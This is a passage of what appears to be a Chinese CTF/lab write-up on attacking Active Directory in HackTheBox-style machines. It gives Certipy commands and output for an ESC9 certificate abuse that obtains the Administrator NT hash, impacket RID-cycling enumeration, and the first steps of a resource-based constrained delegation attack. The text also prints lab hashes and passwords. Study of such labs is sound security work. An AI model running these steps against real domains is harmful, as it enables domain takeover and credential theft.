a stacktrace<br>[!] <span class="hljs-symbol">Error</span> checking web enrollment: timed out<br>[!] <span class="hljs-symbol">Use</span> -debug to print a stacktrace<br>[*] <span class="hljs-symbol">Saving</span> text output to <span class="hljs-string">&#x27;20260219041503_Certipy.txt&#x27;</span><br>[*] <span class="hljs-symbol">Wrote</span> text output to <span class="hljs-string">&#x27;20260219041503_Certipy.txt&#x27;</span><br>[*] <span class="hljs-symbol">Saving</span> <span class="hljs-symbol">JSON</span> output to <span class="hljs-string">&#x27;20260219041503_Certipy.json&#x27;</span><br>[*] <span class="hljs-symbol">Wrote</span> <span class="hljs-symbol">JSON</span> output to <span class="hljs-string">&#x27;20260219041503_Certipy.json&#x27;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>存在<code>NoSecurityExtension</code>便可使用ESC9进行攻击</p>
+<p>寻找漏洞证书模板。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">Certificate</span> <span class="hljs-string">Authorities</span><br>  <span class="hljs-number">0</span><br>    <span class="hljs-attr">CA Name                             :</span> <span class="hljs-string">certified-DC01-CA</span><br>    <span class="hljs-attr">DNS Name                            :</span> <span class="hljs-string">DC01.certified.htb</span><br>    <span class="hljs-attr">Certificate Subject                 :</span> <span class="hljs-string">CN=certified-DC01-CA,</span> <span class="hljs-string">DC=certified,</span> <span class="hljs-string">DC=htb</span><br>    <span class="hljs-attr">Certificate Serial Number           :</span> <span class="hljs-string">36472F2C180FBB9B4983AD4D60CD5A9D</span><br>    <span class="hljs-attr">Certificate Validity Start          :</span> <span class="hljs-number">2024-05-13 15:33:41+00:00</span><br>    <span class="hljs-attr">Certificate Validity End            :</span> <span class="hljs-number">2124-05-13 15:43:41+00:00</span><br>    <span class="hljs-string">Web</span> <span class="hljs-string">Enrollment</span><br>      <span class="hljs-string">HTTP</span><br>        <span class="hljs-attr">Enabled                         :</span> <span class="hljs-literal">False</span><br>      <span class="hljs-string">HTTPS</span><br>        <span class="hljs-attr">Enabled                         :</span> <span class="hljs-literal">False</span><br>    <span class="hljs-attr">User Specified SAN                  :</span> <span class="hljs-string">Disabled</span><br>    <span class="hljs-attr">Request Disposition                 :</span> <span class="hljs-string">Issue</span><br>    <span class="hljs-attr">Enforce Encryption for Requests     :</span> <span class="hljs-string">Enabled</span><br>    <span class="hljs-attr">Active Policy                       :</span> <span class="hljs-string">CertificateAuthority_MicrosoftDefault.Policy</span><br>    <span class="hljs-string">Permissions</span><br>      <span class="hljs-attr">Owner                             :</span> <span class="hljs-string">CERTIFIED.HTB\Administrators</span><br>      <span class="hljs-string">Access</span> <span class="hljs-string">Rights</span><br>        <span class="hljs-attr">ManageCa                        :</span> <span class="hljs-string">CERTIFIED.HTB\Administrators</span><br>                                          <span class="hljs-string">CERTIFIED.HTB\Domain</span> <span class="hljs-string">Admins</span><br>                                          <span class="hljs-string">CERTIFIED.HTB\Enterprise</span> <span class="hljs-string">Admins</span><br>        <span class="hljs-attr">ManageCertificates              :</span> <span class="hljs-string">CERTIFIED.HTB\Administrators</span><br>                                          <span class="hljs-string">CERTIFIED.HTB\Domain</span> <span class="hljs-string">Admins</span><br>                                          <span class="hljs-string">CERTIFIED.HTB\Enterprise</span> <span class="hljs-string">Admins</span><br>        <span class="hljs-attr">Enroll                          :</span> <span class="hljs-string">CERTIFIED.HTB\Authenticated</span> <span class="hljs-string">Users</span><br><span class="hljs-string">Certificate</span> <span class="hljs-string">Templates</span><br>  <span class="hljs-number">0</span><br>    <span class="hljs-attr">Template Name                       :</span> <span class="hljs-string">CertifiedAuthentication</span><br>    <span class="hljs-attr">Display Name                        :</span> <span class="hljs-string">Certified</span> <span class="hljs-string">Authentication</span><br>    <span class="hljs-attr">Certificate Authorities             :</span> <span class="hljs-string">certified-DC01-CA</span><br>    <span class="hljs-attr">Enabled                             :</span> <span class="hljs-literal">True</span><br>    <span class="hljs-attr">Client Authentication               :</span> <span class="hljs-literal">True</span><br>    <span class="hljs-attr">Enrollment Agent                    :</span> <span class="hljs-literal">False</span><br>    <span class="hljs-attr">Any Purpose                         :</span> <span class="hljs-literal">False</span><br>    <span class="hljs-attr">Enrollee Supplies Subject           :</span> <span class="hljs-literal">False</span><br>    <span class="hljs-attr">Certificate Name Flag               :</span> <span class="hljs-string">SubjectAltRequireUpn</span><br>                                          <span class="hljs-string">SubjectRequireDirectoryPath</span><br>    <span class="hljs-attr">Enrollment Flag                     :</span> <span class="hljs-string">PublishToDs</span><br>                                          <span class="hljs-string">AutoEnrollment</span><br>                                          <span class="hljs-string">NoSecurityExtension</span><br>    <span class="hljs-attr">Extended Key Usage                  :</span> <span class="hljs-string">Server</span> <span class="hljs-string">Authentication</span><br>                                          <span class="hljs-string">Client</span> <span class="hljs-string">Authentication</span><br>    <span class="hljs-attr">Requires Manager Approval           :</span> <span class="hljs-literal">False</span><br>    <span class="hljs-attr">Requires Key Archival               :</span> <span class="hljs-literal">False</span><br>    <span class="hljs-attr">Authorized Signatures Required      :</span> <span class="hljs-number">0</span><br>    <span class="hljs-attr">Schema Version                      :</span> <span class="hljs-number">2</span><br>    <span class="hljs-attr">Validity Period                     :</span> <span class="hljs-number">1000 </span><span class="hljs-string">years</span><br>    <span class="hljs-attr">Renewal Period                      :</span> <span class="hljs-number">6</span> <span class="hljs-string">weeks</span><br>    <span class="hljs-attr">Minimum RSA Key Length              :</span> <span class="hljs-number">2048</span><br>    <span class="hljs-attr">Template Created                    :</span> <span class="hljs-number">2024-05-13T15:48:52+00:00</span><br>    <span class="hljs-attr">Template Last Modified              :</span> <span class="hljs-number">2024-05-13T15:55:20+00:00</span><br>    <span class="hljs-string">Permissions</span><br>      <span class="hljs-string">Enrollment</span> <span class="hljs-string">Permissions</span><br>        <span class="hljs-attr">Enrollment Rights               :</span> <span class="hljs-string">CERTIFIED.HTB\operator</span> <span class="hljs-string">ca</span><br>                                          <span class="hljs-string">CERTIFIED.HTB\Domain</span> <span class="hljs-string">Admins</span><br>                                          <span class="hljs-string">CERTIFIED.HTB\Enterprise</span> <span class="hljs-string">Admins</span><br>      <span class="hljs-string">Object</span> <span class="hljs-string">Control</span> <span class="hljs-string">Permissions</span><br>        <span class="hljs-attr">Owner                           :</span> <span class="hljs-string">CERTIFIED.HTB\Administrator</span><br>        <span class="hljs-attr">Full Control Principals         :</span> <span class="hljs-string">CERTIFIED.HTB\Domain</span> <span class="hljs-string">Admins</span><br>                                          <span class="hljs-string">CERTIFIED.HTB\Enterprise</span> <span class="hljs-string">Admins</span><br>        <span class="hljs-attr">Write Owner Principals          :</span> <span class="hljs-string">CERTIFIED.HTB\Domain</span> <span class="hljs-string">Admins</span><br>                                          <span class="hljs-string">CERTIFIED.HTB\Enterprise</span> <span class="hljs-string">Admins</span><br>        <span class="hljs-attr">Write Dacl Principals           :</span> <span class="hljs-string">CERTIFIED.HTB\Domain</span> <span class="hljs-string">Admins</span><br>                                          <span class="hljs-string">CERTIFIED.HTB\Enterprise</span> <span class="hljs-string">Admins</span><br>        <span class="hljs-attr">Write Property Enroll           :</span> <span class="hljs-string">CERTIFIED.HTB\Domain</span> <span class="hljs-string">Admins</span><br>                                          <span class="hljs-string">CERTIFIED.HTB\Enterprise</span> <span class="hljs-string">Admins</span><br>    [<span class="hljs-string">+</span>] <span class="hljs-attr">User Enrollable Principals      :</span> <span class="hljs-string">CERTIFIED.HTB\operator</span> <span class="hljs-string">ca</span><br>    [<span class="hljs-type">!]</span> <span class="hljs-string">Vulnerabilities</span><br>      <span class="hljs-attr">ESC9                              :</span> <span class="hljs-string">Template</span> <span class="hljs-string">has</span> <span class="hljs-literal">no</span> <span class="hljs-string">security</span> <span class="hljs-string">extension.</span><br>    [<span class="hljs-string">*</span>] <span class="hljs-string">Remarks</span><br>      <span class="hljs-attr">ESC9                              :</span> <span class="hljs-string">Other</span> <span class="hljs-string">prerequisites</span> <span class="hljs-string">may</span> <span class="hljs-string">be</span> <span class="hljs-string">required</span> <span class="hljs-string">for</span> <span class="hljs-string">this</span> <span class="hljs-string">to</span> <span class="hljs-string">be</span> <span class="hljs-string">exploitable.</span> <span class="hljs-string">See</span> <span class="hljs-string">the</span> <span class="hljs-string">wiki</span> <span class="hljs-string">for</span> <span class="hljs-string">more</span> <span class="hljs-string">details.</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>此漏洞的核心在于：对证书模板拥有注册权限的用户（如此处的 ca_operator）可以请求证书，并且由于模板配置不当（缺少必要的安全扩展，如 CT_FLAG_NO_SECURITY_EXTENSION 未设置），攻击者可以通过在证书请求中指定一个备用主体名 (SAN) 来冒充其他用户，例如域管理员。<br>————————————————<br>版权声明：本文为CSDN博主「人衣aoa」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45203884/article/details/148122349">https://blog.csdn.net/qq_45203884/article/details/148122349</a></p>
+</blockquote>
+<p>使用 <code>Certipy</code> 工具将 NT hash (<code>a091c1832bcdd4677c28b5a6a1295584</code>) 更新到 <code>ca_operator</code> 账户，并修改了该账户的 <code>userPrincipalName</code> (UPN) 为 <code>Administrator</code></p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# certipy-ad account <span class="hljs-keyword">update</span> -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -<span class="hljs-keyword">user</span> ca_operator -upn Administrator<br>Certipy v5<span class="hljs-number">.0</span><span class="hljs-number">.4</span> - <span class="hljs-keyword">by</span> Oliver Lyak (ly4k)<br><br>[*] Updating <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;ca_operator&#x27;</span>:<br>    userPrincipalName                   : Administrator<br>[*] Successfully updated <span class="hljs-string">&#x27;ca_operator&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>请求到了一张代表管理员的证书</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# certipy-ad req -u ca_operator@certified.htb -p <span class="hljs-string">&#x27;Pwned_CA_123!@#&#x27;</span> -ca certified-DC01-CA -<span class="hljs-keyword">template</span> CertifiedAuthentication -<span class="hljs-keyword">debug</span><br>Certipy v5<span class="hljs-number">.0</span><span class="hljs-number">.4</span> - <span class="hljs-keyword">by</span> Oliver Lyak (ly4k)<br><br>[+] DC host (-dc-host) <span class="hljs-keyword">not</span> specified. <span class="hljs-keyword">Using</span> <span class="hljs-keyword">domain</span> <span class="hljs-keyword">as</span> DC host<br>[+] Nameserver: <span class="hljs-keyword">None</span><br>[+] DC IP: <span class="hljs-keyword">None</span><br>[+] DC Host: <span class="hljs-string">&#x27;CERTIFIED.HTB&#x27;</span><br>[+] Target IP: <span class="hljs-keyword">None</span><br>[+] Remote <span class="hljs-type">Name</span>: <span class="hljs-string">&#x27;CERTIFIED.HTB&#x27;</span><br>[+] <span class="hljs-keyword">Domain</span>: <span class="hljs-string">&#x27;CERTIFIED.HTB&#x27;</span><br>[+] Username: <span class="hljs-string">&#x27;CA_OPERATOR&#x27;</span><br>[+] Trying <span class="hljs-keyword">to</span> resolve <span class="hljs-string">&#x27;CERTIFIED.HTB&#x27;</span> at <span class="hljs-string">&#x27;192.168.21.2&#x27;</span><br>[+] Resolved <span class="hljs-string">&#x27;CERTIFIED.HTB&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">cache</span>: <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.186</span><br>[+] Generating RSA key<br>[*] Requesting certificate via RPC<br>[+] Trying <span class="hljs-keyword">to</span> <span class="hljs-keyword">connect</span> <span class="hljs-keyword">to</span> endpoint: ncacn_np:<span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.186</span>[\pipe\cert]<br>[+] Connected <span class="hljs-keyword">to</span> endpoint: ncacn_np:<span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.186</span>[\pipe\cert]<br>[*] Request ID <span class="hljs-keyword">is</span> <span class="hljs-number">5</span><br>[*] Successfully requested certificate<br>[*] Got certificate <span class="hljs-keyword">with</span> UPN <span class="hljs-string">&#x27;Administrator&#x27;</span><br>[*] Certificate has <span class="hljs-keyword">no</span> <span class="hljs-keyword">object</span> SID<br>[*] Try <span class="hljs-keyword">using</span> -sid <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> the <span class="hljs-keyword">object</span> SID <span class="hljs-keyword">or</span> see the wiki <span class="hljs-keyword">for</span> more details<br>[*] Saving certificate <span class="hljs-keyword">and</span> private key <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;administrator.pfx&#x27;</span><br>[+] Attempting <span class="hljs-keyword">to</span> <span class="hljs-keyword">write</span> data <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;administrator.pfx&#x27;</span><br>[+] Data written <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;administrator.pfx&#x27;</span><br>[*] Wrote certificate <span class="hljs-keyword">and</span> private key <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;administrator.pfx&#x27;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>恢复ca的原始upn</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kaada)-<span class="hljs-selector-attr">[/home/kali/Desktop]</span><br>└─# certipy-ad account -username management_svc<span class="hljs-keyword">@certified</span> -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip <span class="hljs-string">&#x27;10.129.231.186&#x27;</span> -upn <span class="hljs-string">&#x27;ca_operator@certified.htb&#x27;</span> -user <span class="hljs-string">&#x27;ca_operator&#x27;</span> <span class="hljs-attribute">update</span><br><br>Certipy v5.<span class="hljs-number">0.4</span> - by Oliver Lyak (ly4k)<br><br>[*] Updating user <span class="hljs-string">&#x27;ca_operator&#x27;</span>:<br>    userPrincipalName                   : ca_operator<span class="hljs-keyword">@certified</span>.htb<br>[*] Successfully updated <span class="hljs-string">&#x27;ca_operator&#x27;</span><br>                                      <br></code></pre></td></tr></table></figure>
+
+<p>使用 <code>Certipy</code> 工具，通过 <code>administrator.pfx</code> 证书文件以 <code>administrator@certified.htb</code> 用户身份进行 Kerberos 认证，并成功获取 TGT 和 NT hash</p>
+<p>记得要先对齐域控时间（kerbros的五分钟原则）</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs prolog">┌──(root㉿kaada)-[/home/kali/<span class="hljs-symbol">Desktop</span>]<br>└─# sudo ntpdate <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.186</span><br><span class="hljs-number">2026</span><span class="hljs-number">-02</span><span class="hljs-number">-18</span> <span class="hljs-number">15</span>:<span class="hljs-number">30</span>:<span class="hljs-number">20.560486</span> (<span class="hljs-number">-0500</span>) <span class="hljs-number">-46560.448366</span> +/- <span class="hljs-number">0.045121</span> <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.186</span> s1 no-leap<br><span class="hljs-symbol">CLOCK</span>: time stepped by <span class="hljs-number">-46560.448366</span><br>                                                                                                                                                           <br>┌──(root㉿kaada)-[/home/kali/<span class="hljs-symbol">Desktop</span>]<br>└─# certipy-ad -debug auth -pfx administrator.pfx -username administrator -domain certified.htb -dc-ip <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.186</span><br><span class="hljs-symbol">Certipy</span> v5<span class="hljs-number">.0</span><span class="hljs-number">.4</span> - by <span class="hljs-symbol">Oliver</span> <span class="hljs-symbol">Lyak</span> (ly4k)<br><br>[+] <span class="hljs-symbol">Target</span> name (-target) and <span class="hljs-symbol">DC</span> host (-dc-host) not specified. <span class="hljs-symbol">Using</span> domain <span class="hljs-string">&#x27;&#x27;</span> as target name. <span class="hljs-symbol">This</span> might fail for cross-realm operations<br>[+] <span class="hljs-symbol">Nameserver</span>: <span class="hljs-string">&#x27;10.129.231.186&#x27;</span><br>[+] <span class="hljs-symbol">DC</span> <span class="hljs-symbol">IP</span>: <span class="hljs-string">&#x27;10.129.231.186&#x27;</span><br>[+] <span class="hljs-symbol">DC</span> <span class="hljs-symbol">Host</span>: <span class="hljs-string">&#x27;&#x27;</span><br>[+] <span class="hljs-symbol">Target</span> <span class="hljs-symbol">IP</span>: <span class="hljs-string">&#x27;10.129.231.186&#x27;</span><br>[+] <span class="hljs-symbol">Remote</span> <span class="hljs-symbol">Name</span>: <span class="hljs-string">&#x27;10.129.231.186&#x27;</span><br>[+] <span class="hljs-symbol">Domain</span>: <span class="hljs-string">&#x27;&#x27;</span><br>[+] <span class="hljs-symbol">Username</span>: <span class="hljs-string">&#x27;ADMINISTRATOR&#x27;</span><br>[*] <span class="hljs-symbol">Certificate</span> identities:<br>[*]     <span class="hljs-symbol">SAN</span> <span class="hljs-symbol">UPN</span>: <span class="hljs-string">&#x27;Administrator&#x27;</span><br>[*] <span class="hljs-symbol">Using</span> principal: <span class="hljs-string">&#x27;administrator@certified.htb&#x27;</span><br>[*] <span class="hljs-symbol">Trying</span> to get <span class="hljs-symbol">TGT</span>...<br>[+] <span class="hljs-symbol">Sending</span> <span class="hljs-symbol">AS</span>-<span class="hljs-symbol">REQ</span> to <span class="hljs-symbol">KDC</span> certified.htb (<span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.186</span>)<br>[*] <span class="hljs-symbol">Got</span> <span class="hljs-symbol">TGT</span><br>[*] <span class="hljs-symbol">Saving</span> credential cache to <span class="hljs-string">&#x27;administrator.ccache&#x27;</span><br>[+] <span class="hljs-symbol">Attempting</span> to write data to <span class="hljs-string">&#x27;administrator.ccache&#x27;</span><br>[+] <span class="hljs-symbol">Data</span> written to <span class="hljs-string">&#x27;administrator.ccache&#x27;</span><br>[*] <span class="hljs-symbol">Wrote</span> credential cache to <span class="hljs-string">&#x27;administrator.ccache&#x27;</span><br>[*] <span class="hljs-symbol">Trying</span> to retrieve <span class="hljs-symbol">NT</span> hash for <span class="hljs-string">&#x27;administrator&#x27;</span><br>[*] <span class="hljs-symbol">Got</span> hash for <span class="hljs-string">&#x27;administrator@certified.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">0</span>d5b49608bbce1751f708748f67e2d34<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="lookupsid枚举域用户"><a href="#lookupsid枚举域用户" class="headerlink" title="lookupsid枚举域用户"></a>lookupsid枚举域用户</h2><blockquote>
+<p><strong>匿名 LookupSID 枚举</strong>（Anonymous LookupSID Enumeration），也常被称为 <strong>RID 循环&#x2F;劫持 (RID Cycling)</strong>，是活动目录 (Active Directory) 渗透测试和 CTF 靶机中非常经典且高效的信息收集技术。</p>
+<p>它的核心在于：攻击者在<strong>没有任何有效域凭证</strong>（即没有任何用户名和密码）的情况下，通过建立匿名连接（空会话），利用 Windows 系统的 RPC（远程过程调用）接口，暴力猜测并解析出域内所有的用户名和组名。</p>
+</blockquote>
+<figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs ldif">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># impacket-lookupsid anonymous@192.168.21.130</span><br>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies <br><br><span class="hljs-attribute">Password</span>:<br>[*] Brute forcing SIDs at 192.168.21.130<br>[*] StringBinding ncacn_np:192.168.21.130[\pipe\lsarpc]<br>[*] Domain SID is: S-1-5-21-3649830887-1815587496-1699028491<br><span class="hljs-attribute">498</span>: NOVICE\Enterprise Read-only Domain Controllers (SidTypeGroup)<br><span class="hljs-attribute">500</span>: NOVICE\Administrator (SidTypeUser)<br><span class="hljs-attribute">501</span>: NOVICE\Guest (SidTypeUser)<br><span class="hljs-attribute">502</span>: NOVICE\krbtgt (SidTypeUser)<br><span class="hljs-attribute">512</span>: NOVICE\Domain Admins (SidTypeGroup)<br><span class="hljs-attribute">513</span>: NOVICE\Domain Users (SidTypeGroup)<br><span class="hljs-attribute">514</span>: NOVICE\Domain Guests (SidTypeGroup)<br><span class="hljs-attribute">515</span>: NOVICE\Domain Computers (SidTypeGroup)<br><span class="hljs-attribute">516</span>: NOVICE\Domain Controllers (SidTypeGroup)<br><span class="hljs-attribute">517</span>: NOVICE\Cert Publishers (SidTypeAlias)<br><span class="hljs-attribute">518</span>: NOVICE\Schema Admins (SidTypeGroup)<br><span class="hljs-attribute">519</span>: NOVICE\Enterprise Admins (SidTypeGroup)<br><span class="hljs-attribute">520</span>: NOVICE\Group Policy Creator Owners (SidTypeGroup)<br><span class="hljs-attribute">521</span>: NOVICE\Read-only Domain Controllers (SidTypeGroup)<br><span class="hljs-attribute">522</span>: NOVICE\Cloneable Domain Controllers (SidTypeGroup)<br><span class="hljs-attribute">525</span>: NOVICE\Protected Users (SidTypeGroup)<br><span class="hljs-attribute">526</span>: NOVICE\Key Admins (SidTypeGroup)<br><span class="hljs-attribute">527</span>: NOVICE\Enterprise Key Admins (SidTypeGroup)<br><span class="hljs-attribute">553</span>: NOVICE\RAS and IAS Servers (SidTypeAlias)<br><span class="hljs-attribute">571</span>: NOVICE\Allowed RODC Password Replication Group (SidTypeAlias)<br><span class="hljs-attribute">572</span>: NOVICE\Denied RODC Password Replication Group (SidTypeAlias)<br><span class="hljs-attribute">1000</span>: NOVICE\DC$ (SidTypeUser)<br><span class="hljs-attribute">1101</span>: NOVICE\DnsAdmins (SidTypeAlias)<br><span class="hljs-attribute">1102</span>: NOVICE\DnsUpdateProxy (SidTypeGroup)<br><span class="hljs-attribute">1104</span>: NOVICE\MrRobot (SidTypeUser)<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="RBCD（基于资源的约束委派）"><a href="#RBCD（基于资源的约束委派）" class="headerlink" title="RBCD（基于资源的约束委派）"></a>RBCD（基于资源的约束委派）</h2><p>第一步：创建机器账户</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# impacket-addcomputer novice.com/MrRobot:mrroboto12 -dc-ip <span class="hljs-number">192.168</span><span class="hljs-number">.21</span><span class="hljs-number">.130</span> -computer-<span class="hljs-type">name</span> <span class="hljs-string">&#x27;EVILPC$&#x27;</span> -computer-pass <span class="hljs-string">&#x27;EvilPass123!&#x27;</span><br>Impacket v0<span class="hljs-number">.14</span><span class="hljs-number">.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies <br><br>[*] Successfully added machine account EVILPC$ <span class="hljs-keyword">with</span> <span class="hljs-keyword">password</span> EvilPass123!.<br><br></code></pre></td></tr></table></figure>
+
+<p>第二步：实施滥用 (写入委派属性)</p>
+<p>我们将域控的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性修改为刚刚创建的 <code>EVILPC$</code>。</p>
+<p>“逼迫域控承认：<code>EVILPC$</code> 有资格代表任何人来访问我。”</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# impacket-rbcd -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;DC$&#x27;</span> -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;EVILPC$&#x27;</span> -dc-ip <span class="hljs-number">192.168</span>.<span class="hljs-number">21.130</span> -action <span class="hljs-string">&#x27;write&#x27;</span> <span class="hljs-string">&#x27;novice.com/MrRobot:mrroboto12&#x27;</span><br>Impacket v0.<span class="hljs-number">14.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies <br><br>[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity <span class="hljs-keyword">is</span> <span class="hljs-keyword">empty</span><br>[*] Delegation rights modified successfully!<br>[*] EVILPC$ can now impersonate users <span class="hljs-keyword">on</span> DC$ via S4U2Proxy<br>[*] Accounts allowed <span class="hljs-keyword">to</span> act <span class="hljs-keyword">on</span> behalf <span class="hljs-keyword">of</span> other identity:<br>[*]     EVILPC$      (S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3649830887</span>-<span class="hljs-number">1815587496</span>-<span class="hljs-number">1699028491</span>-<span class="hljs-number">2101</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>第三步：伪造高权限票据 (S4U2Self &amp; S4U2Proxy)</p>
+<p>使用 <code>EVILPC$</code> 的凭证，向域控申请一张<strong>伪造身份为 <code>Administrator</code></strong>（或者任何高权限域管）的服务票据 (Service Ticket)。</p>
